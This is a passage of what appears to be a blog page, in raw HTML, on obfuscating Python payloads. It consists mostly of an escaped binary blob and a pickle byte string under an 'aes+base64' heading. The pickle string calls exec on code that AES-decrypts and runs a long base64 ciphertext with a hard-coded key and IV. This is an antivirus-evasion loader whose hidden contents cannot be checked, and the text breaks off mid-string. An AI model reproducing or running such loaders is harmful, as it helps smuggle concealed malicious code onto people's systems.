 *\x18Q\x8d\&#x27;\xba\xc3j\xf8\x94\xdfe\x90\x18\xb9\x11\xbeB\n ;)\xdf\xf4\x17\xc5\xa1i\x80\x05(\x02\x87M\x95\xb5X\xd7&lt;\xd4|\xca\x8e\x958/\xa7\xfez\x93@|\xa3\x0242\n\x06\xf0\xc8\xef\xe0\xd8\x1cM\x96\x14\xad\x7f\x84\xc3\x16\x0e\x03P\x9b\xb0\xa0\x1d\xe8\x95:\x8f\x12_\x92\xc2t\x00\xfa\xa7\xa5\x9f\x86\xe5\x1f\xb0\x9b\x12 1\xf7\xe3\xac\x02\\)\xfd\xcf9\xbf\xcdv\x03\xc8\x10\x08\xd1T\xe29\xd4\xc2\x1e$G\xf2\x80\xf8\xbd\x0edU\xfe\xac\xa7;\xab;\xd7\xca\xd6\x05(H\xea\xc0+3J\x9c*\xd0\x87b\x9b\x18\xd5\x82-zk\x85\xad\x10uf? \xc6[\x05?\x13\x1e\x05Hc\xff&#125;M\xae\xc2\xbb3\x81\xbf*\x18\xcb\xf4\xe1\x92\xb0\xc1\x96B\xed\xc6\xdbB)\xdcN\x88\x00\xc4\xc7\x12\xa7\xef\xbb&quot;LL\xa8\x8f@M\xa3\x8fN\xd5&quot;\x8f.\xbe\x9c\x8c\xcd\xe0&lt;\x1c\x14\xd0RW\xa4\xbf|9\xdc\x86i\x14\x82FCA\x07\x91Sb\xb87~\xb6\xbb\x05\xedR\x9e\xd0\xd3^\xb2\x05$\xfc$T#$\x8f\x1cpd\xeb$\xee@\xfeS5uF\xf7\x05rz\xcd\xbe\x83\\[a\xe1\xdfV\xc5\x1f\xff\x99\xf3\xca\xe8Q\xf6\x9eoNHxu\xe2\xa1F\xc9R5\xcc\x9c\x86/7\xbe\xc1\xb4\xfc\xb2u\x1eR\xa6\xea\xf8\xf30z\xeb\xdb\xc9\x06,\x0c\x8a:A\x9a\xc44Q\xfa\xfc1\x8au\x0e\xe6\\E\xfb\x1e1iQ\xbf,\xdd;\xdd\xfaQ\xccf8^\x93\n\xcb\xd7l\xbd\xc2\xaa\x03\xf2fi\xab\x88\x1f,\xc3\xb9\x80\x97\xbd\x16;j\x0b\xb9]r\xe6Kb\x91Nh\xa4zo\x97ZY~\x88\xc2\x05u8\xe6\xc71\xf2\x99\xd9\xde\xad\x93\x89\xac\x8b)$\x8d\x97\x85\x95\xe1\xf8\xdat\x12\x0e\x81\xd7\xc9\xae\xc0]\xa8\x1b\xadg\xa9uE\xf5z\x1f\xe1-\xe4\xbc&amp;\xea$f\xea\xaayV\x9d\xaf\xdfT\x18--\xcf\x90\xd6(cYc\xba\x0b\x8a\xf4%\x98\xc4\xf3VRX@\xd1KL\x8eO;\xdb/\xb6\xa5\x95\xb5\x03Q\xa3~;\xef&amp;\x17\xecQI\xa9\xd6\xb4R\xad\x87\xf3\x03\xac\x84\\\x0e\xe2\xf9\x920u\xa0\xa4\x14r\xd5\xef\x96\x80\xde\xb9\x8f\xfd\xbam[\x83&lt;\x08\xb3H\xa3\xfb\xc8\x9eZ\xaf\xf0T-\xde\xfaf\xea\xf3k\xc3\xd1\xfb\x93\x185l\xdf\xbaoI\xdeo\xfbF`\xda\x92\xfa\xed6\xcf\xc0~\xb9\x88\x0f\xe5\xbf\x90\xacI\x01WJ\xdf\x0bL\x12*\xee\xe4vm/\x0c\x1f\xfc\xb5\xe9\xfc\x0ednp\x11\x8f\x97-MT\x0f\xf2\x0f&quot;\xaa#\xdd\x16\xd4V!Gs\\\x121\x96\xcf\x1d\xed\x7f*\xae\xca\xd5\x92\x1f&lt;\xd0Z\xe7\xefxms\xacRU\x08\xd0\xe4&gt;i\xf0\xbfq&gt;\xc9\x17Bm#\x94=P\x9a\x1a\xce\xd1\xb6Ux\xb5\x18\xdd\x1dz\xbe\x89\x85\xec\xa6^\xb5\x07\x8b\xe0a27\x8du&#125;|~\xb0\x12D)\x89\x8c\xde\xf4r\x0f(\x07\x9e\x0b\xb1\xfb\xc0\x81n\xcd\xcd%\x137\xd8\x9b\x94\x9d0\x8e$\xb8;\xfe\x02\xcc\x80\x97o6\xf9\xfcw\xbb\x8b\x89\x82\x9a%1K\xcb\x05\xfc\t\xa6\xd5\xa2\xb6\x9dd\x07\xbf\xbfI\x97$\x17\x1f\x04Y\x96\xbb\x96vb_\xc9\x9e\xb8\xaa\xccM\xe4\n\xd3C\xa0\x04\xacht\xb9\xefJ\xef\xcc\xf4=Mi\xa1\xf6\x85-\xa9%\xf2\&#x27;\xa2\xe3f\xad\x07\xaa\xd9\x82;\xf3\x00\x8fe\x0b\&#x27;8L\x00\xdb\x0e\x17\x94\xd1\x02\xac\xbd\x1e\xac\xb7\x0b\xed7\xf5\x0e\x9d\xe6\xec\x9eM\x8fp\x16\xff\x14\xcf\xd4\x0e\x9b\x7f\x02\xc8\x9c\xfd\xb9iZ\x93kvf\xcf\xbd\x80R\x1bE\xc0\xeew\xd4UJ\x84G\x04\xfd1x\x9b\xe9\x80\xf4\xdfh\xb0\x92\x05&lt;T\x84\t\xdf\xb9\xf9m\x86\x86\xe3\xedk\xd2\xdb\xeb\xa5\xbeD\xfe\xa9\x8c\xf5)\xbb\xe6&quot;\x06\xe7F\xcd\xbf\x1aesMHB\x9b)\n\xbfX\xcb\xbaG\x01\x01a\t(\xa9\xac\xf7G\xa5U\xfe\xb9$\x1cH\xf5x&amp;Z\x94\xc8\x18\xdd\xef\x94\xf8_p&amp;t97\x1a\xcc\xaf\xe2Sv\xc1=&#123;\xf5\xce\x1e\xb8Ya\xf8\xee\xb7R\xdf\x8c\x97\x105-B\xf5\xf5~^\t\xf8\xc0\xdb\x16\xef\x91\x01\xab\xf0\xfe\xdfO?Ud\xce.\xdf\x04\xb9/\x80\xbeW\xedw\xed\xd6\xde=\xfdme\x08#\x16\xd1_=\x93x\xcc\xfc\xac\xfd\x9c\x02\xe6\x9e[Ng\x89X\x91\xa5Z\x9c\xe7=\xfc\x8b\xc0\x9a\xf8\x19LVao\x80XF\xdf\xf0\xb2KD+\x85\xdc-D\x18\xb1\x90!F\xf8-[b+\nU\x97\x1c\xacsx\x7fX\x1ae1Y 8\xac#9\x93\xa4\xa1\xb68\x8d\xbf\x92t%?\x9e\xc8jRZ,\xf1\xbb\xe2\x84\xa3f\x90a\x1d\xfb,\x94m\xbfu\xb7\x86j\x86\x9bz\r\x00\xaf\x143\x80\xe4\xa1\n\xf4\x02P.\x9av\xd6H\xc2\xfc\x87\x0b\xdc\xbf&#125;.\&#x27;+\x08\xd0\xd9\xb3\xb7\xc2\xc1\xdbF\xdc\xe89\nh\xc4\xc9\xe1\x17\xcca\xac\xfb\x9c\x14\xd0=\x83\xfe4\xeb\x02\xc1\xe0\xef\x19\xa2\xd4u\x19\x04Z\xbb\xb7&amp;\x8a\x85u\x9b\xd6\xa0\xa8?\xe2\xbc\x11\xf8\x8b\xe5\x06mG\x89\x07\xc3.\xa3\xe3\xab\x94\&#x27;\x16&#123;U\xdc\xca\xb3\xca\xc22\xc35y\xdehE\xff\n\x17\x96\x93\xd8\xa7(\xba\x87\xfa8\x95\x99\xf4&amp;\xf9\x94\x84\xa2\x07R:\xedRN\x1b\x19\xd4as\xfd\x08&lt;\x9d\xf9\x0c\xd8\x06\xfc\x12w\x8b\x19\x0e\xb17\xe26\x8ad!1\x91\xd2\x84\xcbP\x99N\xf2\xed\xf9G.\xcd\x02&amp;\xceh\xeb\xa1\x89j\xc0\xfa\x11(\n\xe0\xcb\xe6G\x953\xcc\x9c\xbb\x14\xe4\xd5\x7f\t\x9dQ[\xc1\x88\xd6\xea\xc0\xf0 \x9e\x8dh\xff\xb4:\x0ci~\xc0\xd8T\xbaES\xc40\x82r\xa9\x7f\x93\x9ac\x14bW&gt;\xea]\xd9\x04\xc8\t\xaf\x06\xef\xb1\x12\xc1\x91j\x01\xb9\x07\tz\xcec\x03\xc5\xe1\x19\x8d\xd5&#125;q\x1f\x1f\xbc\xed\x12&quot;\xf4\x90\t\x9e\xe1/X\&#x27;uu\x05\xa8yU\x87\xcd\xfe8\xc7\x01\xee$\x04\xcd\x8cE=&gt;\xd3t\x17\x00+\xc7\xeeQ\x96\xdd\x85\x1e\xd9\t&quot;\n\r\xed\xdf\x96\xe2P\xf7s\x84TQezYVM\x05\xfd\x1a\xb4\xff\xc2V\xd2W&quot;sI\xa3\xa2\x1e%8.\xcc\x1c\x8b-\xde\x00.\xb1r\xf3\xc1\xf5\xc5Z\xdd\xcc\x1d\x9f\xa1\xc0~\xe4\x03\x033V\x81\x0e\x1cLs\x95|\xf7,Ry\xf7\x10\&#x27;5bV\x1a\xaf[B\x18\x94q\xf6p\xba\x9eM\xea\xc2\x13)Cqc\x1bAi\x93\x9d\x86 G\x1c\xbd.\x10)t\xbd\xeb\xf3\x85\x98&#125;\xf1\xccx\x1bT\xff\xe2z\x93]\x8d\x0e\xcb\xe1\xde\x97\x11u\xff%^\x8b\x1f\xab\xc2\x18\x98$4\x16\xa2\x07\x18\x19x\x8d\xaa\x04\xfbo\xa8\xd7M\x1dJ\xef\xf8~&#123;\x83\xb3H\xbb\x94l\xe3dC\xe8\xba\xee\x03\x8a\x85\xd8r\x06Lg\x10\xc7\x88G&#125;\xbb1\xdb\xed=\xb8.\x1aQ^W\xf3/\x94\xc5\xadz\xad%\t\xa5\xfc\x9bM\x9e.@\xb7\xfb\xeaD\xf8*\xd3\xdf\xa1\x85_\xa5j\xcd\x01us\x9ew,E\xcb\x85.f\t\xa8J\xce\xc7&quot;i\x88\xe4g\xa3\x06\n\xce\x134&lt;\x01\xd0+\xc1\xec\xc2qM\x1d\x94e\x82\xe5,J\xa4\xba\xf3\xc0F\x07zR\xbf\xa3k\x01z\x07\xfe2&#125;\xdc\x9b\xd9v\x1b\x83\xb4\x0c\x93Vz%\xadQu\xb6\x97\x9f\x0b^\xd5\xba*\xd7\x1cwS\xfeF\xbc\x9c\xb56\\\xce\x83OM&#125;\xbe\xb4\xd2\x8f\xe8t\x87E\x81\xae\xfa\x0e\x1fh+f\x94n\x85\x15\xc0\xf4\xda\x9e?S!+=|&lt;T\x1cG\xa4\xfbO\xee:\xea\x0cC\x86\xc3x\xec=\x98bA*\x94\x03&#125;t\xd3\xa3\x9d$n\xb9!`\xa2\x9d\xfb\xa5\xfc\xac\xba\x19?\xd7kT\xc1\xbc\x1f\x17erS\x1e\xa1:\x8fJ\xd9Y\xcc\x16\x8d&#125;7\x1fC\xe0\xaf\xc6V6\xe3\xd0/\x1c(\xea\xa9c\xfe\xb7\xf3\xe7\&#x27;8\x1e\x97:\x15x\x94\xbera\x8fT\x13\x11\xe8q\xbc\xb1\xc7\xde\x8a\x96 t\xc3\xdd\x15\x81\xe4a\r\xb9\x042\x82\xbd\xf0\xcaC\xd1\x18\xd1$\x9d&quot;\xb2\xb2\xd4\xfa\xda\xfa\xd1\x17\xac\xf6kl\rR^\x10\xd5*\x1d\x12\x05v\xc9\x93\xab\xcd&#123;,\x7f\xa4Qb`\xca[;O\xb4K\xdc\x99\xb5\xe4\xae&quot;\x1a\x84\x17\x87\x00\x84e\x8e\xa8H\x91\x01\x90\xe0V\xe7e\x98\tF\x05\xd3\x9a\xda\xc0YOq\x8f\xf1C\x8c\x0eCW\x98a\xa61R\xb9\xfe\x06&#125;\xed\xbd\xb7u\xfbQ*Vh-\xc2\x07\x8e\xa4\xbb#\x8ax\xa0\xd3\xa2\xd0\x07\xbe\xd5y\xefS\x81\x9a\x88\xdc\xcbV\xd7\xbd\x1a\xbc\xcb\xe3 \xb1\xc39\xca\xca\x96\x9f\xfb\xdbm&#123;h\xd6\xa1\xb1\xe0\xbas\xf1\xa3X\x1c\x84\xdd\xaa\xb4Nw\x05uk6\x89\x83/\x12pk\xbcz\x11D\xe6\x9d\xe8\xdcn\x950\x03\x9aP5h\xe6?\x92\xe8,\xa8\x94O\xad\x85r\xff\x96\n13\x8dr\xb0\xbc\xd1\x13\xee\x9a\xa2&#123;\x87&amp;W(S\xb2S6\xbd\xa1K\x97&gt;1B\xc1e,\xa66!]e\x8a\x9f\xe4i\xbd\nO\xde\xd9\xb36\xc9\x91]!3a\xde\xc3l\xc1\x1e\xb3\xbd\xd3\\\xce~\tA\x1a\x819$[\x8d$\xbf3\x16p\xa1v\xdb\t\x9d|\xa1sY\xd4\xfa\x98Jp\xe7i\x11V\xd2\xfe\xc7a\xf6\xc6\xa0\xda\xa3[\x80\xb2w\xa2\\c\n\xe0k@\x87\xd2(\xbb\x83\xd1xt\xc1\xac\x8f\xe5\xcce\x8b^|uQP\xcb\x89\xd7.jp\xa4\x9d\xb8\xcd5I\xa0\xeb\x98\xbcu6sz\xbe^\x9d\xc2!\rW\x96[\x11cwh\x1cR\xd6\xa5\xad\xdd#\xd9t7\x00+es\xbb\xf3\x10\xbd_\x93\x9b%\xb9\x04?\x8b\xfd\xfe,o\xfag\x87\xb1\xe2y\xc9\xdf\x1e\x7f\xff3?\xfd\xf2\x0c\x08&lt;\x0b;O\xa2\xf0\xbc\xa5\xdf\x7f;\xe0\x81\xda^\x1d\xe6P\xa4qS1&quot;!\x07\x9b\xc7\x1e\xdc2@\xd3\xf1H[\xb3\xa1\x94Z\xfa\x00\xc0b\xb8($i\xdd\xcf\xaeJj\xb4\xde\xb2\\\xcd\xad\xca\xff\xc2\xbah\xa4\xeaE\x8c\xe5\xad\x84MS\xc3\x98\xd1L\xe3\xf1\x91\xf3&#125;\xdb\xc0\xe8\xb7\xde\xd9\xc2\xad\x9c8\xed\xf1\xf2\x15\x85\xd3\x1f\xe9e\xd2\xe5P\xbbG\xadw\xcc\x18\xef\xfa\xf7D`\xc3\xa19T\x9b\x856\x9a\xa5\xafE\xa2\x0e\x92\x05\x8e\xe3\xc5\xbe\xa7\xca\xd8\x1aN$\xfb\xbex\x15\xa9b\\\xd3\xe4\x0c\x8e+n\x1d\xa2\x96\t\xa3\x1fv\x13\x92&lt;\xdd\xad\x1a\x8c\x03W \xbb\x8biT\x83a&quot;\xf4\x18r\x06b-\x1dZS\xf5\xef\xee\t\x1e\xf2l\x18\xd0#\xdd\x96\xde0\xfd\x9e&#125;\xc2\x1aQc\xe9*s\x1a`\x05j\xfd\x02\x91\xa4\xa9\x15+\xbb\x97\xf0\xb9\x03\x17\x83\x16\x9b^\xd4(\xf0\x16\xc8e3\xff\x12&#125;\x81\xc7=d&#123;\xf1e\xf3\x8e\xf7\xa6\xa9\x9f|\x01\xd6\xcc&amp;\x1e\x19\xb9\x92\xc9\x86\xf9\xf0\x91B_\xa2\xe7[\x1b\x1co\x02\xc8\xc0)#\xea\xbb\x1b\xb0\xa20\xcb#\x129\xfc\xb5Js\xdcg\xf2\xb2~[\x1e\x8cJE9\x11\xcd\xa3v\x0fp,\xeb\xfe\x06\x05\xa3L^@\xef\x9b\x8c\x86-\xaaI\x97\xca\xd7\t#E|s\x11\x86\xa9A*d\xec\xcf\xcc\xce\x85w\xda8\x9ar+\xd7\x0f;cu\x03t\xe3\xc7_\x81\xe9&#123;\xed\xb1\x8c\x14\xff\xd5\xc0LVe&amp;+\xa5bT\xd5\x81\xf6\x13`*\xe7\xca\x824\xc1\xa5\x03`\xbfw\xf2\xb9Seq\x81mE\xe9`Jj\xac\x8b&amp;64z\xf8e\xfb/\x80\xeeb\xfc\xf9\x84!\xd9\x90Y\xa9\xd8\xd44\x91?m\xf3\x9a\x9e\x7f?\xcf\xd6&lt;\xa8\x8b\xf3L($\x93\xffX&lt;G\x0f\x91ZNI\xe3&#123;\xc3\xa0v\xfd\x8c\xd20\xc1\x83\x05\xbc\xcf1h\xe2\xdf\xcf\xbfC\x9e\xfb\x98\xa7h\xb2\xe2\xa7\xb2\x8e..\x10\xcb\x8c[)\xc6e6d\xea|i\xeb\x16\xff\xe0\xe8\xe6\xad\xc65\x14\x9c&gt;E)\x84\xf8B\xb2\x90?=(\x87\xd2\xa3\x17i.\xf8\xf7\xad\x16\x9b\xdbM\xf6\xadY\xe5\x9d\x0b\xcbCA\xabP\x9f\xd4\xddT\x90m;])IF\xf28\xcf\xb9\x00\x04&gt;\x10\x07#h\xd3\x97\xad\xf1\xf3)t\xb4E\xdaG\x1f0\xc0\xb4\xaaoc&lt;f+\x83,\xee\x91\xb9q\x82\xf8^\xb5\xb7S\x13\xa4\x0fs\xee`\x93E\xba\x97&lt;\xb6d\xfc\x84\xf2D)\xf2#\xc9&quot;d\x05\x88)\xaa\x1dm\x1cj\x1bZ\xff\x02\xffU\xd7\xe9\xdb\xaeT\xa2\x17\x1b&amp;\xcf\xa3\xcb\x85*\xa0\x97c\xff\x18Mz\xe7\xa2\xe7zx~\xb9\xf6\x14\xff\xd3\xc1G\x0e\xfd\xc5\xe1R\xf4r\xecU\x8c\x84\xee)\x0b\x8a\xa3\x98\x1b+\x95\x15\x08b\xa9^\x98JV\xba\x8c&gt;\x07\xca\x11\xd5b\xb6\x1e\n\x97.&gt;R\xca&lt;fd\xe0\n6\x8f]\x11\xcc0x\xf3y\x00\xb1\xde\x13\xd1\x02\xc2\x1a\xe3\\W\xf6\xf6\x88\xa2~\xf6\xc8m\x14\x9e&gt;\x86\xa77#$\x8bW\x01N\x92%R\x85\x81\xf8\xa8\xb9\xaa\xcc\x18\x07\x1d\x9e`^\xd3\xfcC\xfe\xb0X\x8d\x0e\x13\xb1\xdc\x1d`\xae\x99\x04\xbae\xfe\x7f&gt;\xc5~\xa1\x03\xb0\x1b6\xca\x17k\x03X\x04\x15\xb7@\n\x0c\x99X\xdeo\xca\xfe\x81O\xd6\x9f\xa5\xcb]]\x00\x9b\xf0*\&#x27;\x98tk\xdf\x84ku\x8e\n\xb1\xa8S\xe2\xfe\xa6Q\xf9\x01\xf4\xff\xc4 +\x89\xf4Z\x18\xf4\x91\xae\xd3p\x071\xfc\xfc\x1a@E\x1a\xc0!!\xa2u~\x08\x89\x14*\x94b!\xe8\x02\xbaQ\xcb\x17\xe0\xa9\x11^\xed+\x9b\xfa\x95\xb0*(\x90\xb9\x9f?\xc2\x89G&quot;L\x18`\x8c5\xe0\xad\xef\xc6JG\x8dt5\x13\xc3\xf5\x03`d\x85D\xc2\xae\xd38\xddT\xd2\x96\x19/F\xe5\xf5?\x96\xea\xe2HUw\xcb\x9c0\xb2\xe3\x01\xaa(zT&#125;\x89\x84\xbaa\xed:\xe2Yk\xd0\xbd\x89&quot;F7\xe3\x7f\xaf\x8b\xf3\xe5\xbcZ\\\xa7\xf4,`\xe5WPy\x18\xd0\xca(H\x91\x1fG%\x187\x19\xfaN\\\n7\x0f7t\xe1\x91\x8b$W\x0f3\xae\x1by\xba\xc1\x15nbi\xb5\xa7\x0eY\x07:\xb3\xc0\xbc\x7f\x1fH\xaf\xd1\x7f\x1f\x9a\xae:s\x90\x11\xe2\xa8\xb0\xf4\x9f\xb1\x8dg[\xedk\xc9@.C\xc8\xc5I\xf4\r\x93w\xe5\x90\xdd\x8c\xbf\x1f\x9bqGi\xfe\xac\x9cr\x90\xcd0 \x82\xd2\xf1C\x81M\xccedfF.&#125;\x87\x17\xa5\x81\x07\x86\xe61\xdc\xbe\xa3\xc6\xd0p\xf91O\xe1s&gt;V\xb0\x92\xfe@&#125;\xdcb\xa6\x9f6\xb0U/\x96N\xedN\xf9\xf4\xc0\x1f\x15\x1c\xedw+\xf3&#123;\xc4\x1f\xb1\xd7\xb2\x12\xf1\xdf\xed\x92\xa3 \xf0\xef~\xf5WI\xde\xa7\xcb!\x0e:)$]t\xe2\xcd\xeb4\x9d)\x84\xa3\x94\xb1\xaf\xb4\xf6\x84\x98^#~_\xca\xb4\xc6E\x94\x00\xc7N\xafn\xd4\x97\xb7\xd7\x00\xbf\x92\xca\x8dA\x7fxa\xb5\xb4\xf3&lt;\x81j\xe9\&#x27;\xbd6~P\xcb\xd9\xdc\xf9p\xad\xc0t\x11\xf3&amp;o\xa9&amp;\xbe-V\xba`\x801m\xcdA\x92\xef\xc7\x0e I\x0e\x8d\xd0\xca\xe7\x1f\x8f\x91FqP\r\x10UVbt&lt;\xa3\x87\xc5\x860/I&amp;\xfb(&lt;\xcc\xff\xd5\x98.l\x94\xec\xb3zt!CRN\xc3\x9fp.\x12\xa5\xad\x95+\xd7*\x16\xd0&#125;\xfc\xc20u\x89\xc4t\x81\xc4\x9f\x95\xcf=\xb0\x04\xb4\x89_*\xd12z\xeb\t9\x19\x91\x00\x81\x02l\xee\xc8\xf3\xb5\x8a\x11\x95\x18\xc0\xe2\xc1\n\x8b\x18l\xea1HX\x83\xd7w\xf7a-\xda\xbe&#125;\xdf\xc2!\xaez\x00\x85.\xdf|\x7f\xb3s\xf3\xb3\x82\x93\x8d\xc1DJ\x1f\xb6\x18\x96\xeb\xde&quot;\xfd\xff\x04\xfbwh\xe5oP\x08\xc7\x7f\x155F8\xd3\x11\x01y%&#123;NjBW\x8b\xa8\x1em\xd4\xb4\xa4\xc1Fa\x00\xed\xa9\xc5\xd6Px\xcd[\x85_b\x81!=z\x87J\x1c\xbdG\x97\xaa\x86\&#x27;\xb7D\xdd]\xef\xec\x8a\xe1\xc1d\xb7&lt;\x81\xef\xa5\xb4\xd9\xccTh\xaf\xa4&lt;x@\xd8\xd0\xb8\x13c\xcd#\x03p\x80\xc6\xbf\xec\x8f!\xa1\xe8\xd4\xb5i\xc9\xb7vd\x89Y\xe9\xb5H\x9c\x8eW\xe1\x87&amp;\x199P%9[;\x8a\xe3\xd1\x07\xce\x88\xabe\xa1\xdf\x1c\xc5\xd1&amp;\x9ew\x9b\xb4\x1d\x16~\xccB\xe1\xb8j-2\xb4\xcd\xf49\xe3p\xcc3\x99\xfa\x08\xa3\xfc^\xd0p\xf7g]\xcfE\xb7\xd1\x03\xb2\x1d\x90S\&#x27;\xdf\x8c^Z\xf8\x91\xb7\xea\x0bU\xc4\x11o\x07\xad\xcf\xf7\xc1&amp;a\xa5\xcd\x15k\xd9%\xe0\xa4\xbey\xd3\x15\xf4k\x16\x1e\x02\xfb\xd6\x93\t\xab\x0b\x08\xde\x97\xc5,N_\xc8_\xc8#&#125;\xab\x8c\x17|\x800\xf0z\xf8G|\xearL\xbe\x04\xec\xe5%\\M\xa6\x91\xb0\xddz\x04\xde\xe0&#125;Q\xa5M\x85w\xfdl\xf4\x92X\x1e\x86\x00\x00m\xf9\x04\xa6\xc2ep\x1fUp&#123;\x84\x11\x8eh@4&#123;\x9b-u7\x0f\x9b</span><br></code></pre></td></tr></table></figure><h3 id="aes-base64"><a href="#aes-base64" class="headerlink" title="aes+base64"></a>aes+base64</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/602008/1658910318401-7f513064-4099-49c9-afd6-3032010efe36.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">b&quot;\x80\x04\x95\x89\x14\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94Xj\x14\x00\x00b=AES.new(b&#x27;LKspYP9HJNzj7RtE4Dcd8UF2ZikIov0=&#x27;,AES.MODE_CBC,b&#x27;fljtMD3vC5GU0VLg&#x27;).decrypt(base64.decodebytes(b&#x27;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&#x27;+b&#x27;=&#x27;*(len(b&#x27;RoIJhNkSZZzhzI7nLbUbC2le1zvsuS2Gbhw1cjb6s36W16dB/qyWhSnuRc+HCQAhIvUzUszhLio+20xZVpxbXXcdRWPFhF7kyXXGjkAOle8HU6RUGjUzB1Ls0O3dofquXlUUnXO1mxjBQRHLQ03fnm785qScoF7JVayvHkAVOKu8+F+nfXtc+Szb95kziLvhAa+Lt5prLHWPwZ8kHg1l3x5Xv55o72u35FTXZTqqfob4uESLJds3PvhSnHhsTLsn5mKZoCBkSfP5cdISKCMPlHZbESyQUplaqNS7TfIpo4lFPKicmZ4+t4GRAT0J6TwkQ6GBsBZ16zCT+C8aL2LCzLX61KSeyr/56u475/vz3MeBZtI9BkTpyqtGriTv8Gqycdyfa9dsvQ+WCR96zOYrMu84tluJjxlMzFGfDuua302XvnXs0jttypMm2oKU8QI367d4unDIbFDCIFu/8m+lG4irxWrEa7EGMtR6yGogaiGEHb0oJ3kbNiPKdPpkpRsEkorm8iHOZ8Kh71VqKj95aemMK0MSHwoKbD6Js0DgnHDcy6sR/DE9LBlG6kHLPWMLfv6RtW92YCG36AeIIMRbJLxWabPgsfhcuMqM+MrQkM4X3NO7TmOxtB2fkEMkPzhyZWP+DVoYWsp2Q61cCoylvbEU/PC1OIpbaSNxjqUc8JCey7g7VmbL+BrKx1STAbJd4gbcR2kF01S70BLruDwopa1moOuq0wwY5IDJJKwVtRpGuGNwrBv2X+ZYduEIvKAzSjiJjSb27rLfXYTO7VKR6fv/mAS4dkroy2RZmHMxUKeM9S+x/SWuz79qAfmbm0mhYeww424ig1JUiRcpc2yQcIMloLGWew5TXplpf7aiABTp+GkwbHb4kLJdwWaq2eASd1P+QigpGQbWcJ9GoLfmVPxSH2CMbw3q3cFJiFNDMokSmMCik1MLTG1d0/4veTApBjCxHesCwAyWJ+piO2cQF7B1+G80xUOIt7J/Fd5QsJPD0Sw2EGHcWLx5hG1FbuaK/5FBrwyy8YKt2o7SYI4ZuzExe0dRcwmaR7xqCuz6ow1xqxlfMh4+n4xLRYsjILxyML+/1NqxfwEa1TovUZSMCHtCBu7k+OQHK6c2SsKSoI42/SZw+iT9Hi6322xnCjQbPeTpYiQ6ydjTZR1HCiCHPxN/BRTWa7U675EOeho/mgDFd9F3jLRjd7d4SpNo3JJCa/t45p4LIdkxHKcBpFpdIs67apgC5tyjHUzVPtPJ9eY3